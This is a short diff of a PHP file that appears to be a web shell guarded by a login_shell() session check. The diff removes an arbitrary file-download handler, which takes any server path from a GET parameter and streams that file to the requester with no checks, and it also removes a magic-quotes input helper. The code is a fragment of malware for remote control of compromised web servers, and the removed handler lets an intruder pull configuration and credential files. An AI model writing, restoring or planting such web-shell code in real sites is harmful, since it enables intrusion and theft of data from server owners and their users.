@@ -99,26 +99,6 @@ if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
     else
         login_shell();
 
-if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
-    @ob_clean();
-    $file = $_GET['file'];
-    header('Content-Description: File Transfer');
-    header('Content-Type: application/octet-stream');
-    header('Content-Disposition: attachment; filename="'.basename($file).'"');
-    header('Expires: 0');
-    header('Cache-Control: must-revalidate');
-    header('Pragma: public');
-    header('Content-Length: ' . filesize($file));
-    readfile($file);
-    exit;
-}
-
-if(get_magic_quotes_gpc()) {
-	function idx_ss($array) {
-		return is_array($array) ? array_map('idx_ss', $array) : stripslashes($array);
-	}
-	$_POST = idx_ss($_POST);
-}
 ?>
 <!DOCTYPE HTML>
 <html>
